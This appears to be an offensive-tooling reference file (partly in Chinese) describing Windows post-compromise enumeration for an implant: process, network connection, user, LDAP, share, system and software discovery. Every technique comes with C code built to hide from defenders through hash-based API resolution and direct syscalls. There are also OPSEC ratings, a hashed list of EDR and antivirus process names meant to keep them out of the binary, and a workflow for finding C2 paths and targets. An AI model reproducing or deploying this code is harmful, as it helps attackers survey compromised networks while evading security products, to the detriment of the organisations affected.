# Host & Network Enumeration Techniques

## Overview

主机和网络枚举技术，用于信息收集和态势感知。所有技术通过 PEB walk + hash 动态解析 API，避免 IAT 暴露敏感函数名。

---

## Technique 1: Process Enumeration

> OPSEC: 🟢 Low
> Sysmon: None (read-only system query)
> ETW: Microsoft-Windows-Kernel-Process (if enabled)
> EDR Hooks: NtQuerySystemInformation occasionally monitored
> Mitigation: Use NtQuerySystemInformation instead of CreateToolhelp32Snapshot for lower profile

### Method A: NtQuerySystemInformation (Preferred)
```c
// Process enumeration via NtQuerySystemInformation — no toolhelp32
// SystemProcessInformation (5) returns linked list of SYSTEM_PROCESS_INFORMATION

typedef struct _SYSTEM_PROCESS_INFORMATION {
    unsigned long NextEntryOffset;
    unsigned long NumberOfThreads;
    unsigned char Reserved1[48];
    UNICODE_STRING ImageName;
    long BasePriority;
    void* UniqueProcessId;
    void* InheritedFromUniqueProcessId;
    unsigned long HandleCount;
    unsigned long SessionId;
    // ... more fields
} SYSTEM_PROCESS_INFORMATION;

void EnumProcesses(void) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);
    
    typedef long (__stdcall *tNtQuerySystemInformation)(
        unsigned long, void*, unsigned long, unsigned long*);
    tNtQuerySystemInformation pNtQSI = 
        (tNtQuerySystemInformation)PebGetProc(pNtdll, HASH_NtQuerySystemInformation);

    // Allocate buffer (start with 1MB, grow if needed)
    unsigned long bufSize = 1024 * 1024;
    PVOID pBuf = NULL;
    SIZE_T sz = bufSize;
    
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pBuf, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    unsigned long retLen = 0;
    long status = pNtQSI(5/*SystemProcessInformation*/, pBuf, bufSize, &retLen);
    
    if (status == 0) {
        SYSTEM_PROCESS_INFORMATION* proc = (SYSTEM_PROCESS_INFORMATION*)pBuf;
        while (1) {
            // proc->ImageName.Buffer = process name (Unicode)
            // proc->UniqueProcessId = PID
            // proc->NumberOfThreads = thread count
            
            if (proc->NextEntryOffset == 0) break;
            proc = (SYSTEM_PROCESS_INFORMATION*)((unsigned char*)proc + proc->NextEntryOffset);
        }
    }
}
```

### Method B: CreateToolhelp32Snapshot
```c
// Simpler but uses kernel32 APIs (more visible in IAT if not PEB-resolved)
typedef void* (__stdcall *tCreateToolhelp32Snapshot)(unsigned long, unsigned long);
typedef int (__stdcall *tProcess32FirstW)(void*, void*);
typedef int (__stdcall *tProcess32NextW)(void*, void*);

tCreateToolhelp32Snapshot pSnap = (tCreateToolhelp32Snapshot)ResolveApi(HASH_KERNEL32, HASH_CreateToolhelp32Snapshot);
tProcess32FirstW pFirst = (tProcess32FirstW)ResolveApi(HASH_KERNEL32, HASH_Process32FirstW);
tProcess32NextW pNext = (tProcess32NextW)ResolveApi(HASH_KERNEL32, HASH_Process32NextW);

void* hSnap = pSnap(0x2/*TH32CS_SNAPPROCESS*/, 0);

typedef struct {
    unsigned long dwSize;
    unsigned long cntUsage;
    unsigned long th32ProcessID;
    void* th32DefaultHeapID;
    unsigned long th32ModuleID;
    unsigned long cntThreads;
    unsigned long th32ParentProcessID;
    long pcPriClassBase;
    unsigned long dwFlags;
    wchar_t szExeFile[260];
} PROCESSENTRY32W;

PROCESSENTRY32W pe = {0};
pe.dwSize = sizeof(pe);
if (pFirst(hSnap, &pe)) {
    do {
        // pe.szExeFile = process name
        // pe.th32ProcessID = PID
        // pe.th32ParentProcessID = parent PID
    } while (pNext(hSnap, &pe));
}
```

---

## Technique 2: AV/EDR Detection

> OPSEC: 🟢 Low
> Purpose: Identify security products before deciding on evasion techniques

### Known EDR Process Names
```c
// Check running processes against known EDR/AV process names
// Use djb2 hash comparison to avoid string literals

typedef struct {
    unsigned long hash;     // djb2 hash of lowercase process name
    const char*   product;  // for reporting (stack string or encrypted)
} EDR_SIGNATURE;

// Hash-based EDR detection (no plaintext EDR names in binary)
static const unsigned long edr_hashes[] = {
    // CrowdStrike
    0x00000000, // csfalconservice.exe
    0x00000000, // csfalconcontainer.exe
    // SentinelOne
    0x00000000, // sentinelagent.exe
    0x00000000, // sentinelone.exe
    // Microsoft Defender
    0x00000000, // msmpeng.exe
    0x00000000, // mssense.exe
    // Carbon Black
    0x00000000, // cbdefense.exe
    0x00000000, // repwsc.exe
    // Sophos
    0x00000000, // sophossps.exe
    0x00000000, // savservice.exe
    // Kaspersky
    0x00000000, // avp.exe
    0x00000000, // kavfswp.exe
    // ESET
    0x00000000, // ekrn.exe
    0x00000000, // egui.exe
    // Huorong (火绒)
    0x00000000, // hipstray.exe
    0x00000000, // wsctrl.exe
    0x00000000, // hipsdaemon.exe
    // 360 Safe
    0x00000000, // 360tray.exe
    0x00000000, // zhudongfangyu.exe
    // Trend Micro
    0x00000000, // pccntmon.exe
    0x00000000, // ntrtscan.exe
    // Elastic
    0x00000000, // elastic-agent.exe
    0x00000000, // elastic-endpoint.exe
    // Cortex XDR
    0x00000000, // cyserver.exe
    0x00000000, // traps.exe
};
// NOTE: Compute actual djb2 hashes for deployment

int DetectEDR(void) {
    int detected = 0;
    // Enumerate processes (Method A or B above)
    // For each process, compute djb2 hash of lowercase name
    // Compare against edr_hashes[] array
    // Return bitmask or count of detected products
    return detected;
}
```

### WMI-based AV Query
```c
// Query WMI AntiVirusProduct class
// SELECT * FROM AntiVirusProduct (root\SecurityCenter2)
// Returns displayName, pathToSignedProductExe, productState
// Requires COM initialization (see lateral_movement.md Technique 1)
```

---

## Technique 3: Network Connection Enumeration

> OPSEC: 🟢 Low
> Sysmon: None
> ETW: None for read operations
> Mitigation: Read-only, minimal footprint

```c
// TCP connection enumeration via GetExtendedTcpTable (iphlpapi.dll)
typedef unsigned long (__stdcall *tGetExtendedTcpTable)(
    void*, unsigned long*, int, unsigned long, int, unsigned long);

// MIB_TCPROW_OWNER_PID structure
typedef struct {
    unsigned long dwState;
    unsigned long dwLocalAddr;
    unsigned long dwLocalPort;
    unsigned long dwRemoteAddr;
    unsigned long dwRemotePort;
    unsigned long dwOwningPid;
} MIB_TCPROW_OWNER_PID;

typedef struct {
    unsigned long dwNumEntries;
    MIB_TCPROW_OWNER_PID table[1];
} MIB_TCPTABLE_OWNER_PID;

void EnumTcpConnections(void) {
    HMODULE hIp = EnsureModule(HASH_IPHLPAPI);
    tGetExtendedTcpTable pGetTcp = 
        (tGetExtendedTcpTable)PebGetProc(hIp, HASH_GetExtendedTcpTable);

    unsigned long bufSize = 0;
    pGetTcp(NULL, &bufSize, 0, 2/*AF_INET*/, 5/*TCP_TABLE_OWNER_PID_ALL*/, 0);
    
    // Allocate buffer and query
    PVOID pBuf = NULL;
    SIZE_T sz = bufSize;
    // Use NtAllocateVirtualMemory for allocation
    // pGetTcp(pBuf, &bufSize, 0, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    
    MIB_TCPTABLE_OWNER_PID* pTable = (MIB_TCPTABLE_OWNER_PID*)pBuf;
    for (unsigned long i = 0; i < pTable->dwNumEntries; i++) {
        // pTable->table[i].dwLocalAddr — local IP (network byte order)
        // pTable->table[i].dwLocalPort — local port (network byte order, use ntohs)
        // pTable->table[i].dwRemoteAddr — remote IP
        // pTable->table[i].dwRemotePort — remote port
        // pTable->table[i].dwOwningPid — owning PID
        // pTable->table[i].dwState — TCP state (ESTABLISHED=5, LISTEN=2, etc.)
    }
}

// UDP enumeration: GetExtendedUdpTable with similar pattern
// IPv6: Use AF_INET6 (23) with MIB_TCP6ROW_OWNER_PID
```

---

## Technique 4: User & Group Enumeration

> OPSEC: 🟢 Low (local), 🟡 Medium (domain — LDAP traffic visible)
> Sysmon: None for local queries
> EDR Hooks: NetUserEnum, NetLocalGroupGetMembers occasionally monitored

### Local Users
```c
// NetUserEnum via netapi32.dll
typedef unsigned long (__stdcall *tNetUserEnum)(
    const wchar_t*, unsigned long, unsigned long, 
    unsigned char**, unsigned long, unsigned long*, unsigned long*, unsigned long*);
typedef unsigned long (__stdcall *tNetApiBufferFree)(void*);

// USER_INFO_0 = just username (level 0)
// USER_INFO_1 = username + password age + privilege + home dir + comment + flags

void EnumLocalUsers(void) {
    HMODULE hNet = EnsureModule(HASH_NETAPI32);
    tNetUserEnum pEnum = (tNetUserEnum)PebGetProc(hNet, HASH_NetUserEnum);
    tNetApiBufferFree pFree = (tNetApiBufferFree)PebGetProc(hNet, HASH_NetApiBufferFree);
    
    unsigned char* pBuf = NULL;
    unsigned long entriesRead = 0, totalEntries = 0, resumeHandle = 0;
    
    // NULL server = local machine
    pEnum(NULL, 0/*level*/, 0/*filter*/, &pBuf, 0xFFFFFFFF, &entriesRead, &totalEntries, &resumeHandle);
    
    // Parse USER_INFO_0 array: each entry is a wchar_t* username
    // pFree(pBuf);
}
```

### Local Groups & Members
```c
// NetLocalGroupEnum + NetLocalGroupGetMembers
typedef unsigned long (__stdcall *tNetLocalGroupEnum)(
    const wchar_t*, unsigned long, unsigned char**, unsigned long,
    unsigned long*, unsigned long*, unsigned long*);
typedef unsigned long (__stdcall *tNetLocalGroupGetMembers)(
    const wchar_t*, const wchar_t*, unsigned long, unsigned char**,
    unsigned long, unsigned long*, unsigned long*, unsigned long*);
```

### Domain Users (LDAP)
```c
// Lightweight LDAP enumeration via wldap32.dll
// ldap_init → ldap_bind_s → ldap_search_s → parse results

typedef void* LDAP;
typedef void* LDAPMessage;

typedef LDAP* (__cdecl *tldap_initW)(const wchar_t*, unsigned long);
typedef unsigned long (__cdecl *tldap_bind_sW)(LDAP*, const wchar_t*, const wchar_t*, unsigned long);
typedef unsigned long (__cdecl *tldap_search_sW)(LDAP*, const wchar_t*, unsigned long,
    const wchar_t*, wchar_t*[], unsigned long, LDAPMessage**);

// Search for all user objects:
// Base: "DC=corp,DC=local"
// Filter: "(&(objectClass=user)(objectCategory=person))"
// Attributes: ["sAMAccountName", "memberOf", "lastLogon"]
```

---

## Technique 5: Network Share Enumeration

> OPSEC: 🟢 Low
> Sysmon: None
> Signature: SMB session setup to enumerate shares

```c
// NetShareEnum via netapi32.dll
typedef unsigned long (__stdcall *tNetShareEnum)(
    const wchar_t*, unsigned long, unsigned char**,
    unsigned long, unsigned long*, unsigned long*, unsigned long*);

// SHARE_INFO_1 structure
typedef struct {
    wchar_t* shi1_netname;    // share name
    unsigned long shi1_type;   // STYPE_DISKTREE=0, STYPE_PRINTQ=1, STYPE_IPC=3
    wchar_t* shi1_remark;     // comment
} SHARE_INFO_1;

void EnumShares(const wchar_t* target) {
    HMODULE hNet = EnsureModule(HASH_NETAPI32);
    tNetShareEnum pShareEnum = (tNetShareEnum)PebGetProc(hNet, HASH_NetShareEnum);
    tNetApiBufferFree pFree = (tNetApiBufferFree)PebGetProc(hNet, HASH_NetApiBufferFree);

    unsigned char* pBuf = NULL;
    unsigned long entriesRead = 0, totalEntries = 0, resumeHandle = 0;
    
    pShareEnum(target, 1, &pBuf, 0xFFFFFFFF, &entriesRead, &totalEntries, &resumeHandle);
    
    SHARE_INFO_1* pShare = (SHARE_INFO_1*)pBuf;
    for (unsigned long i = 0; i < entriesRead; i++) {
        // pShare[i].shi1_netname — share name (e.g. "ADMIN$", "C$", "Users")
        // pShare[i].shi1_type — share type
    }
    pFree(pBuf);
}
```

---

## Technique 6: System Information

> OPSEC: 🟢 Low
> Purpose: Gather OS version, hostname, domain, architecture

```c
// Computer name
typedef int (__stdcall *tGetComputerNameExW)(int, wchar_t*, unsigned long*);
tGetComputerNameExW pGCN = (tGetComputerNameExW)ResolveApi(HASH_KERNEL32, HASH_GetComputerNameExW);

wchar_t hostname[256] = {0};
unsigned long hLen = 256;
pGCN(0/*ComputerNameNetBIOS*/, hostname, &hLen);

wchar_t domain[256] = {0};
unsigned long dLen = 256;
pGCN(2/*ComputerNameDnsDomain*/, domain, &dLen);

// OS Version via RtlGetVersion (ntdll) — not affected by compatibility shims
typedef long (__stdcall *tRtlGetVersion)(void*);
tRtlGetVersion pVer = (tRtlGetVersion)ResolveApi(HASH_NTDLL, HASH_RtlGetVersion);

typedef struct {
    unsigned long dwOSVersionInfoSize;
    unsigned long dwMajorVersion;
    unsigned long dwMinorVersion;
    unsigned long dwBuildNumber;
    unsigned long dwPlatformId;
    wchar_t szCSDVersion[128];
} RTL_OSVERSIONINFOW;

RTL_OSVERSIONINFOW vi = {0};
vi.dwOSVersionInfoSize = sizeof(vi);
pVer(&vi);
// vi.dwMajorVersion = 10, vi.dwBuildNumber = 19041+ for Win10

// Architecture
typedef void (__stdcall *tGetNativeSystemInfo)(void*);
tGetNativeSystemInfo pGNSI = (tGetNativeSystemInfo)ResolveApi(HASH_KERNEL32, HASH_GetNativeSystemInfo);
// SYSTEM_INFO.wProcessorArchitecture: 9=x64, 12=ARM64, 0=x86
```

---

## Technique 7: Installed Software & Patches

> OPSEC: 🟢 Low
> Purpose: Identify installed software (potential targets or dependencies) and missing patches

```c
// Registry enumeration of installed software
// HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*
// HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*

typedef long (__stdcall *tRegOpenKeyExW)(void*, const wchar_t*, unsigned long, unsigned long, void**);
typedef long (__stdcall *tRegEnumKeyExW)(void*, unsigned long, wchar_t*, unsigned long*, void*, void*, void*, void*);
typedef long (__stdcall *tRegQueryValueExW)(void*, const wchar_t*, void*, unsigned long*, unsigned char*, unsigned long*);
typedef long (__stdcall *tRegCloseKey)(void*);

// Enumerate subkeys → read "DisplayName", "DisplayVersion", "Publisher"
// For patches: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages
// Or use WMI: SELECT * FROM Win32_QuickFixEngineering
```

---

## Enumeration Workflow

### Recommended Order
1. **System Info** — OS version, hostname, domain membership
2. **Process Enumeration** — running processes
3. **AV/EDR Detection** — match processes against known EDR list
4. **Network Connections** — active TCP connections (identify C2 paths, existing connections)
5. **User/Group Enumeration** — current user context, local admins, domain groups
6. **Network Shares** — accessible shares on nearby hosts
7. **Installed Software** — identify targets, vulnerable software, security tools

### OPSEC Notes
- All enumeration is **read-only** — no files written, no registry modified
- Prefer `NtQuerySystemInformation` over `CreateToolhelp32Snapshot` (fewer hooks)
- Domain LDAP queries generate network traffic — use sparingly
- NetShareEnum to remote hosts generates SMB traffic — target specific hosts
- Cache results in memory — avoid repeated enumeration calls
